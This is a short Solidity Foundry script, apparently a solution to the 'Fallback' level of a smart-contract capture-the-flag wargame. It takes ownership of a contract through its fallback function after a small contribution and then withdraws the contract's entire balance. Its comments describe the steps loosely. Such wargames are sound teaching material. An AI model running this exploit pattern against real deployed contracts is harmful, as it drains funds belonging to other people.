// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/level1/Fallback.sol";

contract POC is Script {
    Fallback instance = Fallback(payable(0x3DCbd5bE223e21c33F9EDdD9Bc406a44f9AB3dD4));
    function run() external {
        vm.startBroadcast();

        require(address(instance).balance > 0, "No funds in contract");
        
        // The contract receives 0.0001 ether and send it to the instance contract.
        instance.contribute{value: 0.0001 ether}();
        
        // The instance contract sends 1 wei to the contract.
        // The contract will call the fallback function and set the owner to the instance contract.
        address(instance).call{value: 1 wei }("");

        // withdraw funds from the instance contract since you are the owner now.
        instance.withdraw();
        
        require(address(instance).balance == 0, "Could not withdraw funds");

        vm.stopBroadcast();
    }
}